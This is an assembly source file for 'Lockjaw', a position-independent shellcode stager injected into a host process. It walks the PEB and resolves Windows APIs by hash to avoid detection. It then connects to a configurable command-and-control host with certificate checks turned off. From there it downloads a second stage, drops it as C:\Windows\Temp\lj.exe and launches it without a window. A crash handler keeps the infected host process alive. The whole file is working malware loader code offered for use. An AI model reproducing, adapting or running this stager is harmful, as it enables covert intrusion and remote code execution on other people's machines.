# Hardened Pure Assembly PIC Stager for Lockjaw
# v0.2.10 - Safe-stack architecture, shadow-space safety, robust PEB parsing.

.section .text$A, "ax"
.global entry

entry:
    # 1. Immediate Jump to skip the configuration header
    # We use explicit bytes to guarantee the instruction size.
    # eb 0e = jmp +14 (total jump distance including header = 16 bytes)
    .byte 0xeb, 0x0e
    nop                      # Offset 0x02
    nop                      # Offset 0x03
    
    # --- Configuration Header (Fixed Offsets for patching) ---
    # Offset 0x04: KernelBase Hash (4 bytes)
    # Offset 0x08: Kernel32 Hash (4 bytes)
    # Offset 0x0C: Ntdll Hash (4 bytes)
config_kbase_hash: .long 0xAAAAAAAA 
config_k32_hash:   .long 0xBBBBBBBB
config_ntdll_hash: .long 0xCCCCCCCC
    # Total header = 16 bytes.


stager_init:
    # 2. Standard x64 Prologue & Alignment
    movq %rsp, %rax              # RAX = original RSP
    andq $-16, %rsp              # Align RSP to 16 bytes

    # Windows __chkstk contract: Probe page-by-page downward.
    subq $0x1000, %rsp
    movq %rax, (%rsp)            # Probe page 1
    subq $0x1000, %rsp
    movq %rax, (%rsp)            # Probe page 2

    # Set up our stable frame pointers
    movq %rax, 0x10(%rsp)        # Save original (pre-alignment) RSP
    leaq 0x800(%rsp), %rbp       # RBP anchor

    # Load dynamic module hashes from the configuration header (RIP-relative).
    # These values were patched at inject-time by the Agent's Smart-Migrate code.
    lea config_kbase_hash(%rip), %rax
    movl (%rax), %r13d           # r13d = Dynamic KernelBase Hash
    movl 4(%rax), %r14d          # r14d = Dynamic Kernel32 Hash
    movl 8(%rax), %r15d          # r15d = Dynamic Ntdll Hash

stager_start:
    # Zero-initialise ALL frame slots used for function pointers and module handles.
    # This ensures fail_exit never reads garbage when ExitThread has not been resolved yet,
    # and that any NULL-check on an unresolved API correctly falls through.
    movq $0, -0x08(%rbp)         # bytes_read / scratch
    movq $0, -0x10(%rbp)         # hKBase
    movq $0, -0x18(%rbp)         # hK32
    movq $0, -0x20(%rbp)         # hNtdll
    movq $0, -0x28(%rbp)         # (reserved)
    movq $0, -0x30(%rbp)         # hWinHttp
    movq $0, -0x38(%rbp)         # (reserved)
    movq $0, -0x40(%rbp)         # LoadLibraryA
    movq $0, -0x48(%rbp)         # CreateFileA
    movq $0, -0x50(%rbp)         # WriteFile
    movq $0, -0x58(%rbp)         # CloseHandle
    movq $0, -0x60(%rbp)         # CreateProcessA
    movq $0, -0x68(%rbp)         # ExitThread / RtlExitUserThread
    movq $0, -0x70(%rbp)         # AddVectoredExceptionHandler

    # 3. Resolve Base Modules (KernelBase, Kernel32, ntdll)
    movq %gs:0x60, %rax
    movq 0x18(%rax), %rax
    leaq 0x10(%rax), %r12    # r12 = head of InLoadOrderModuleList
    movq %r12, %r11          # r11 = current entry

    find_mod_loop:
    movq (%r11), %r11        # Move to next entry
    cmpq %r12, %r11          # Back to head?
    je mods_done

    movq 0x50(%r11), %rdx    # Buffer (FullDllName UNICODE_STRING)
    testq %rdx, %rdx
    jz find_mod_loop
    movzwq 0x48(%r11), %rcx  # Length (bytes)
    shr $1, %rcx             # Length (chars)

    # Isolate filename (scan backwards)
    movq %rdx, %rax
    movq %rax, %rsi
    leaq (%rax, %rcx, 2), %rsi # rsi points to end of string
    movq %rax, %r8             # default start
    find_slash_back_loop:
    cmpq %rax, %rsi
    je find_slash_done
    subq $2, %rsi
    movzwl (%rsi), %edx
    cmpl $0x5c, %edx           # '\'
    je found_slash_back
    cmpl $0x2f, %edx           # '/'
    je found_slash_back
    jmp find_slash_back_loop
    found_slash_back:
    leaq 2(%rsi), %r8
    find_slash_done:
    movq %r8, %rdx             # filename buffer

    # Calculate length: original_end - r8
    movq 0x50(%r11), %rax      # original buffer
    movzwq 0x48(%r11), %rcx    # original byte length
    addq %rax, %rcx            # original end ptr
    subq %r8, %rcx             # filename byte length
    shr $1, %rcx               # filename char length

    # robust hash: case-insensitive djb2
    xorq %r10, %r10
    movl $5381, %r10d
    mod_hash_loop:
    testq %rcx, %rcx
    jz mod_check
    movzwq (%rdx), %rax
    andl $0xFF, %eax
    cmpb $'A', %al
    jl mod_hash_next
    cmpb $'Z', %al
    jg mod_hash_next
    addb $32, %al
    mod_hash_next:
    imull $33, %r10d
    addl %eax, %r10d
    addq $2, %rdx
    decq %rcx
    jmp mod_hash_loop

    mod_check:
    cmpl %r13d, %r10d        # KB
    jne check_k32
    movq 0x30(%r11), %rax
    movq %rax, -0x10(%rbp)
    jmp find_mod_loop
    check_k32:
    cmpl %r14d, %r10d        # K32
    jne check_ntdll
    movq 0x30(%r11), %rax
    movq %rax, -0x18(%rbp)
    jmp find_mod_loop
    check_ntdll:
    cmpl %r15d, %r10d        # NT
    jne find_mod_loop
    movq 0x30(%r11), %rax
    movq %rax, -0x20(%rbp)
    jmp find_mod_loop





mods_done:
    # 4. Resolve Core APIs from KBase
    movq -0x10(%rbp), %rcx   # hKBase
    testq %rcx, %rcx
    jz fail_exit

    movq -0x10(%rbp), %rcx   # RELOAD KBase
    movl $0xeb96c5fa, %edx   # CreateFileA
    call resolve_api
    movq %rax, -0x48(%rbp)

    movq -0x10(%rbp), %rcx   # RELOAD
    movl $0x3870ca07, %edx   # CloseHandle
    call resolve_api
    movq %rax, -0x58(%rbp)

    movq -0x10(%rbp), %rcx   # RELOAD
    movl $0x37d1f0d7, %edx   # AddVectoredExceptionHandler
    call resolve_api
    movq %rax, -0x70(%rbp)   # slot -0x70: AddVectoredExceptionHandler

    # Progress 0x02: CreateFileA + CloseHandle resolved — canary writes now possible
    lea stager_progress(%rip), %rax
    movl $0x02, (%rax)

    # --- Milestone 0: Core APIs Ready ---
    # Now that CreateFileA and CloseHandle are resolved, we can safely write canaries.
    lea c_s0(%rip), %rcx
    call write_canary_direct


    movq -0x10(%rbp), %rcx   # RELOAD
    movl $0x5fbff0fb, %edx   # LoadLibraryA
    call resolve_api
    movq %rax, -0x40(%rbp)

    movq -0x10(%rbp), %rcx   # RELOAD
    movl $0x663cecb0, %edx   # WriteFile
    call resolve_api
    movq %rax, -0x50(%rbp)

    movq -0x10(%rbp), %rcx   # RELOAD
    movl $0xaeb52e19, %edx   # CreateProcessA
    call resolve_api
    testq %rax, %rax
    jnz cp_ok
    movq -0x18(%rbp), %rcx   # try K32
    testq %rcx, %rcx
    jz cp_fail
    movl $0xaeb52e19, %edx
    call resolve_api
cp_ok:
    movq %rax, -0x60(%rbp)
cp_fail:

    movq -0x10(%rbp), %rcx   # RELOAD
    movl $0x7acb5457, %edx   # ExitThread
    call resolve_api
    testq %rax, %rax
    jnz et_ok
    movq -0x18(%rbp), %rcx
    testq %rcx, %rcx
    jz et_try_nt
    movl $0x7acb5457, %edx
    call resolve_api
    testq %rax, %rax
    jnz et_ok
et_try_nt:
    movq -0x20(%rbp), %rcx   # RELOAD
    testq %rcx, %rcx
    jz et_fail
    movl $0x8e492b88, %edx   # RtlExitUserThread
    call resolve_api

et_ok:
    movq %rax, -0x68(%rbp)
et_fail:



    # Progress 0x03: All core APIs resolved
    lea stager_progress(%rip), %rax
    movl $0x03, (%rax)

    # --- Milestone 1: All Core APIs Resolved ---
    lea c_s1(%rip), %rcx
    call write_canary_direct

    # Progress 0x04: Loading winhttp.dll (loader lock acquisition — can block here)
    lea stager_progress(%rip), %rax
    movl $0x04, (%rax)

    # 5. Load winhttp.dll
    lea winhttp_str(%rip), %rcx
    subq $0x20, %rsp
    call *-0x40(%rbp)
    addq $0x20, %rsp
    movq %rax, %r15           # hWinHttp
    testq %rax, %rax
    jz fail_exit
    movq %rax, -0x30(%rbp)

    # 6. Resolve WinHttp APIs
    movq -0x30(%rbp), %rcx   # hWinHttp
    movl $0x5e4f39e5, %edx   # WinHttpOpen
    call resolve_api
    movq %rax, -0x100(%rbp)

    movq -0x30(%rbp), %rcx   # RELOAD
    movl $0x7242c17d, %edx   # WinHttpConnect
    call resolve_api
    movq %rax, -0x108(%rbp)

    movq -0x30(%rbp), %rcx   # RELOAD
    movl $0xeab7b9ce, %edx   # WinHttpOpenRequest
    call resolve_api
    movq %rax, -0x110(%rbp)

    movq -0x30(%rbp), %rcx   # RELOAD
    movl $0xa18b94f8, %edx   # WinHttpSetOption
    call resolve_api
    movq %rax, -0x118(%rbp)

    movq -0x30(%rbp), %rcx   # RELOAD
    movl $0xb183faa6, %edx   # WinHttpSendRequest
    call resolve_api
    movq %rax, -0x120(%rbp)

    movq -0x30(%rbp), %rcx   # RELOAD
    movl $0x146c4925, %edx   # WinHttpReceiveResponse
    call resolve_api
    movq %rax, -0x128(%rbp)

    movq -0x30(%rbp), %rcx   # RELOAD
    movl $0x7195e4e9, %edx   # WinHttpReadData
    call resolve_api
    movq %rax, -0x130(%rbp)

    movq -0x30(%rbp), %rcx   # RELOAD
    movl $0x36220cd5, %edx   # WinHttpCloseHandle
    call resolve_api
    movq %rax, -0x138(%rbp)



    # Progress 0x05: All WinHttp APIs resolved
    lea stager_progress(%rip), %rax
    movl $0x05, (%rax)

    # --- Milestone 2: WinHttp Ready ---
    lea c_s2(%rip), %rcx
    call write_canary_direct

    # Progress 0x06: WinHttpOpen / Connect / OpenRequest about to be called
    lea stager_progress(%rip), %rax
    movl $0x06, (%rax)

    # 7. Network Sequence
    # WinHttpOpen — NO_PROXY bypasses WPAD/proxy auto-detection
    # Ensure 16-byte alignment before call.
    # Current RSP should be aligned to 16 if prologue was correct.
    
    lea stager_progress(%rip), %rax
    movl $0x17, (%rax)         # 0x17: about to call WinHttpOpen

    lea ua_str_w(%rip), %rcx
    movl $1, %edx              # WINHTTP_ACCESS_TYPE_NO_PROXY = 1
    xorq %r8, %r8
    xorq %r9, %r9
    subq $0x30, %rsp           # shadow space (0x20) + 5th arg (0x08) + alignment (0x08)
    movq $0, 0x20(%rsp)        # dwFlags = 0 (5th argument)
    call *-0x100(%rbp)         # WinHttpOpen
    addq $0x30, %rsp
    movq %rax, %r14            # hSession
    testq %rax, %rax
    jz fail_exit

    # Progress 0x10: WinHttpOpen OK — install VEH before SSL
    lea stager_progress(%rip), %rax
    movl $0x10, (%rax)

    # Install a Vectored Exception Handler BEFORE any SSL/Schannel calls.
    # Schannel cert-chain building can AV in unusual process contexts (missing
    # registry hives, cert stores). The VEH catches the exception and calls
    # ExitThread(1) so the host process is not killed by an unhandled exception.
    testq %rax, %rax           # (rax is stager_progress addr — skip if AddVEH not resolved)
    movq -0x70(%rbp), %rax
    testq %rax, %rax
    jz skip_veh
    movl $1, %ecx              # FirstHandler = 1 (runs before any other handlers)
    lea veh_handler(%rip), %rdx
    subq $0x20, %rsp
    call *%rax                 # AddVectoredExceptionHandler(1, veh_handler)
    addq $0x20, %rsp
skip_veh:

    # Set connect/send/receive timeouts on the session.
    leaq -0x08(%rbp), %rcx
    movl $10000, (%rcx)        # 10s connect
    movq %r14, %rcx
    movl $7, %edx              # WINHTTP_OPTION_CONNECT_TIMEOUT
    leaq -0x08(%rbp), %r8
    movl $4, %r9d
    subq $0x20, %rsp
    call *-0x118(%rbp)
    addq $0x20, %rsp

    lea stager_progress(%rip), %rax
    movl $0x11, (%rax)         # 0x11: connect timeout set

    movl $15000, -0x08(%rbp)
    movq %r14, %rcx
    movl $8, %edx              # WINHTTP_OPTION_SEND_TIMEOUT
    leaq -0x08(%rbp), %r8
    movl $4, %r9d
    subq $0x20, %rsp
    call *-0x118(%rbp)
    addq $0x20, %rsp

    lea stager_progress(%rip), %rax
    movl $0x12, (%rax)         # 0x12: send timeout set

    movl $15000, -0x08(%rbp)
    movq %r14, %rcx
    movl $9, %edx              # WINHTTP_OPTION_RECEIVE_TIMEOUT
    leaq -0x08(%rbp), %r8
    movl $4, %r9d
    subq $0x20, %rsp
    call *-0x118(%rbp)
    addq $0x20, %rsp

    lea stager_progress(%rip), %rax
    movl $0x13, (%rax)         # 0x13: receive timeout set

    # WinHttpConnect
    movq %r14, %rcx
    lea c2_host_val_w(%rip), %rdx
    movzwl c2_port_val(%rip), %r8d
    xorq %r9, %r9
    subq $0x20, %rsp
    call *-0x108(%rbp)
    addq $0x20, %rsp
    movq %rax, %r13
    testq %rax, %rax
    jz fail_exit

    lea stager_progress(%rip), %rax
    movl $0x14, (%rax)         # 0x14: WinHttpConnect OK

    # WinHttpOpenRequest
    movq %r13, %rcx
    lea get_str_w(%rip), %rdx
    lea stage_str_w(%rip), %r8
    xorq %r9, %r9
    subq $0x40, %rsp
    movq $0, 0x20(%rsp)
    movq $0, 0x28(%rsp)
    movl c2_flags_val(%rip), %eax
    movq %rax, 0x30(%rsp)      # WINHTTP_FLAG_SECURE for HTTPS
    call *-0x110(%rbp)
    addq $0x40, %rsp
    movq %rax, %r12
    testq %rax, %rax
    jz fail_exit

    lea stager_progress(%rip), %rax
    movl $0x15, (%rax)         # 0x15: WinHttpOpenRequest OK

    # WinHttpSetOption: SSL ignore flags on request handle
    cmpl $0, c2_flags_val(%rip)
    je skip_ssl
    movq %r12, %rcx
    movl $31, %edx             # WINHTTP_OPTION_SECURITY_FLAGS
    lea ssl_flags_val(%rip), %r8
    movl $4, %r9d
    subq $0x20, %rsp
    call *-0x118(%rbp)
    addq $0x20, %rsp

    lea stager_progress(%rip), %rax
    movl $0x16, (%rax)         # 0x16: SSL cert-ignore flags applied
skip_ssl:

    # Progress 0x07: WinHttpSendRequest about to be called
    lea stager_progress(%rip), %rax
    movl $0x07, (%rax)

    movq %r12, %rcx
    xorq %rdx, %rdx            # lpszHeaders = NULL
    xorl %r8d, %r8d            # dwHeadersLength = 0
    xorq %r9, %r9              # lpOptional = NULL
    subq $0x40, %rsp
    movq $0, 0x20(%rsp)        # dwOptionalLength = 0
    movq $0, 0x28(%rsp)        # dwTotalLength = 0
    movq $0, 0x30(%rsp)        # dwContext = 0
    call *-0x120(%rbp)         # WinHttpSendRequest
    addq $0x40, %rsp
    testl %eax, %eax
    jz fail_exit

    # Progress 0x08: WinHttpReceiveResponse about to block
    lea stager_progress(%rip), %rax
    movl $0x08, (%rax)
    movq %r12, %rcx
    xorq %rdx, %rdx
    subq $0x20, %rsp
    call *-0x128(%rbp)
    addq $0x20, %rsp
    testl %eax, %eax
    jz fail_exit

    # Progress 0x09: Download complete — writing lj.exe to disk
    lea stager_progress(%rip), %rax
    movl $0x09, (%rax)

    # --- Milestone 3: Received ---
    lea c_s3(%rip), %rcx
    call write_canary_direct

    # 8. File Operations
    lea temp_path(%rip), %rcx
    movl $0x40000000, %edx
    xorl %r8d, %r8d
    xorq %r9, %r9
    subq $0x40, %rsp
    movq $2, 0x20(%rsp)
    movq $0, 0x28(%rsp)
    movq $0, 0x30(%rsp)
    call *-0x48(%rbp)
    addq $0x40, %rsp
    movq %rax, %rbx           # hFile
    cmpq $-1, %rax
    je fail_exit

download_loop:
    movq %r12, %rcx
    leaq -0x400(%rbp), %rdx
    movl $1024, %r8d
    leaq -0x8(%rbp), %r9
    subq $0x20, %rsp
    call *-0x130(%rbp)
    addq $0x20, %rsp
    movl -0x8(%rbp), %eax
    testl %eax, %eax
    jz download_done
    
    movq %rbx, %rcx
    leaq -0x400(%rbp), %rdx
    movl -0x8(%rbp), %r8d
    leaq -0x4(%rbp), %r9
    subq $0x30, %rsp
    movq $0, 0x20(%rsp)
    call *-0x50(%rbp)
    addq $0x30, %rsp
    jmp download_loop

download_done:
    movq %rbx, %rcx
    subq $0x20, %rsp
    call *-0x58(%rbp)
    addq $0x20, %rsp

    # 9. CreateProcessA
    lea temp_path(%rip), %rcx
    xorq %rdx, %rdx
    xorq %r8, %r8
    xorq %r9, %r9
    subq $0x80, %rsp
    movq $0, 0x20(%rsp)
    movq $0x08000000, 0x28(%rsp)
    movq $0, 0x30(%rsp)
    movq $0, 0x38(%rsp)
    leaq -0x500(%rbp), %rax
    movq %rax, 0x40(%rsp)
    leaq -0x600(%rbp), %rax
    movq %rax, 0x48(%rsp)
    # Init SI
    movq $0, -0x500(%rbp)
    movl $104, -0x500(%rbp)
    call *-0x60(%rbp)
    addq $0x80, %rsp

    # Progress 0x0A: CreateProcessA called
    lea stager_progress(%rip), %rax
    movl $0x0A, (%rax)

    # --- Milestone 4: Done ---
    lea c_s4(%rip), %rcx
    call write_canary_direct

    # Cleanup
    movq %r12, %rcx
    subq $0x20, %rsp; call *-0x138(%rbp); addq $0x20, %rsp
    movq %r13, %rcx
    subq $0x20, %rsp; call *-0x138(%rbp); addq $0x20, %rsp
    movq %r14, %rcx
    subq $0x20, %rsp; call *-0x138(%rbp); addq $0x20, %rsp

    # Progress 0xFF: stager completed cleanly, calling ExitThread
    lea stager_progress(%rip), %rax
    movl $0xFF, (%rax)

    xorl %ecx, %ecx
    call *-0x68(%rbp)

fail_exit:
    xorl %ecx, %ecx
    inc %ecx
    movq -0x68(%rbp), %rax
    testq %rax, %rax
    jz hard_ret
    subq $0x20, %rsp
    call *%rax
hard_ret:
    # We can't easily restore the original RSP perfectly if we crashed midway,
    # but we saved it at 0x10(%rsp) at the very start.
    # However, ExitThread is safer.
    ret

# --- resolve_api(module:rcx, hash:edx) ---
# Returns function pointer in RAX. Robust, no stack frame.
resolve_api:
    pushq %rbx
    pushq %rdi
    pushq %rsi
    pushq %r11               # current mod in PEB walk
    pushq %r12               # head of PEB walk
    pushq %r13               # Patched KBase hash (CRITICAL)

    movq %rcx, %r8           # base
    movl %edx, %r9d          # target_hash

    movl 0x3c(%r8), %eax
    addq %r8, %rax           # NT Headers
    movl 0x88(%rax), %eax    # Export RVA
    testl %eax, %eax
    jz api_fail

    addq %r8, %rax           # Export Dir
    # We'll use RBX as scratch for Export Dir since we pushed it
    movq %rax, %rbx

    movl 0x18(%rbx), %ecx    # NumNames
    movl 0x20(%rbx), %edi
    addq %r8, %rdi           # AddressOfNames

    xorq %r10, %r10          # Index
api_loop:
    cmpl %ecx, %r10d
    je api_fail

    movl (%rdi, %r10, 4), %eax
    addq %r8, %rax           # Name string

    # djb2
    xorq %r12, %r12          # scratch for hash
    movl $5381, %r12d
hash_loop_api:
    movb (%rax), %sil
    testb %sil, %sil
    jz hash_done_api
    imull $33, %r12d
    movzx %sil, %esi
    addl %esi, %r12d
    incq %rax
    jmp hash_loop_api
hash_done_api:
    cmpl %r9d, %r12d
    je found_api
    incq %r10
    jmp api_loop

found_api:
    movl 0x24(%rbx), %eax
    addq %r8, %rax
    movzwl (%rax, %r10, 2), %eax # ordinal
    movl 0x1c(%rbx), %edx
    addq %r8, %rdx
    movl (%rdx, %rax, 4), %eax
    addq %r8, %rax
    jmp api_exit

api_fail:
    xorq %rax, %rax
api_exit:
    popq %r13
    popq %r12
    popq %r11
    popq %rsi
    popq %rdi
    popq %rbx
    ret

# --- write_canary_direct(path:rcx) ---

write_canary_direct:
    # RCX contains path string
    # We must NOT clobber RBP or any non-volatile registers if possible.
    # We'll use R10/R11 as scratch.
    
    # Correct alignment:
    # Entry RSP = 16n + 8 (after call)
    # subq $0x48, %rsp -> 16n + 8 - 72 = 16(n-4). Aligned!
    subq $0x48, %rsp
    
    movq %rcx, %r10          # Save path in R10 (volatile)

    # CreateFileA(R10, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
    movq %r10, %rcx          # lpFileName
    movl $0x40000000, %edx    # GENERIC_WRITE
    xorl %r8d, %r8d           # dwShareMode
    xorq %r9, %r9             # lpSecurityAttributes
    movq $2, 0x20(%rsp)       # CREATE_ALWAYS
    movq $0x80, 0x28(%rsp)    # FILE_ATTRIBUTE_NORMAL
    movq $0, 0x30(%rsp)       # hTemplateFile
    call *-0x48(%rbp)        # RBP is our stable anchor
    
    cmpq $-1, %rax
    je canary_fail
    
    movq %rax, %rcx          # hFile
    subq $0x20, %rsp         # Shadow space for CloseHandle
    call *-0x58(%rbp)        # CloseHandle
    addq $0x20, %rsp

canary_fail:
    addq $0x48, %rsp
    ret

# --- veh_handler(EXCEPTION_POINTERS*:rcx) -> LONG ---
# Vectored Exception Handler installed before SSL/Schannel calls.
# If Schannel or CryptoAPI raises an unhandled exception (ACCESS_VIOLATION,
# STATUS_IN_PAGE_ERROR, etc.) while building a certificate chain, this handler
# intercepts it and terminates only the stager thread via ExitThread(1),
# preventing the host process from crashing.
# RBP still points to our shared stager frame — function pointers are accessible.
veh_handler:
    # rcx = EXCEPTION_POINTERS* (ignored — we unconditionally abort)
    # Must NOT return EXCEPTION_CONTINUE_SEARCH (0) to avoid propagating.
    movq -0x68(%rbp), %rax   # ExitThread / RtlExitUserThread
    testq %rax, %rax
    jz veh_spin
    movl $1, %ecx            # exit code = 1
    subq $0x20, %rsp
    call *%rax               # ExitThread(1) — does not return
    addq $0x20, %rsp
veh_spin:
    jmp veh_spin             # should never execute; spin as safety net

# --- Static Data (narrow ANSI - for LoadLibraryA and file paths) ---
# All drop paths use C:\Windows\Temp\ which has BUILTIN\Users Write access
# across all integrity levels (medium, low, SYSTEM) unlike C:\Users\Public\
# which can be blocked by AppContainer/reduced-token processes.
winhttp_str: .string "winhttp.dll"
temp_path:   .string "C:\\Windows\\Temp\\lj.exe"
c_s0:        .string "C:\\Windows\\Temp\\lj_s0.txt"
c_s1:        .string "C:\\Windows\\Temp\\lj_s1.txt"
c_s2:        .string "C:\\Windows\\Temp\\lj_s2.txt"
c_s3:        .string "C:\\Windows\\Temp\\lj_s3.txt"
c_s4:        .string "C:\\Windows\\Temp\\lj_s4.txt"
c_m0:        .string "C:\\Windows\\Temp\\lj_m0.txt"

# --- Wide UTF-16LE strings for WinHttp APIs (all WinHttp*W functions) ---
# WinHttpOpen user-agent: L"Mozilla/5.0"
ua_str_w:    .short 'M','o','z','i','l','l','a','/','5','.','0',0
# WinHttpOpenRequest verb: L"GET"
get_str_w:   .short 'G','E','T',0
# WinHttpOpenRequest path: L"/stage"
stage_str_w: .short '/','s','t','a','g','e',0

# WINHTTP_OPTION_SECURITY_FLAGS value: ignore ALL certificate errors for self-signed certs.
# Must pass SECURITY_FLAG_IGNORE_REVOCATION (0x0080) or WinHttpSendRequest will block for
# 30+ seconds while Windows attempts a CRL/OCSP revocation check against an endpoint that
# does not exist on a self-signed certificate. This was the root cause of progress=0x07 stall.
#
#   0x0080 = SECURITY_FLAG_IGNORE_REVOCATION       ← was missing, caused CRL block
#   0x0100 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
#   0x0200 = SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE
#   0x1000 = SECURITY_FLAG_IGNORE_CERT_CN_INVALID
#   0x2000 = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
#   0x3380 = all five ORed together (SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS)
ssl_flags_val: .long 0x3380

# --- Memory Progress Tracker ---
# This dword is updated by the stager at each execution checkpoint.
# The debug_inject command reads it back via ReadProcessMemory after the wait.
# It is ALWAYS the last 4 bytes of the stager binary.
# Values:
#   0x00 = stager has not yet executed past the first resolve_api call
#   0x02 = CreateFileA + CloseHandle resolved; about to write canary 0
#   0x03 = all core APIs resolved; about to write canary 1
#   0x04 = about to call LoadLibraryA(winhttp.dll) [loader lock may block here]
#   0x05 = all WinHttp APIs resolved; about to write canary 2
#   0x06 = about to call WinHttpOpen/Connect/OpenRequest
#   0x07 = WinHttpSendRequest about to be called [network I/O, may block]
#   0x08 = WinHttpReceiveResponse about to be called [network I/O, may block]
#   0x09 = download complete; writing lj.exe to disk
#   0x0A = CreateProcessA called
#   0xFF = ExitThread(0) — stager completed cleanly
stager_progress: .long 0x00000000

.section .text$A, "ax"
c2_host_val: .string "127.0.0.1"
c2_host_val_w: .short 49,50,55,46,48,46,48,46,49,0
c2_port_val: .short 8080
c2_flags_val: .long 8388608
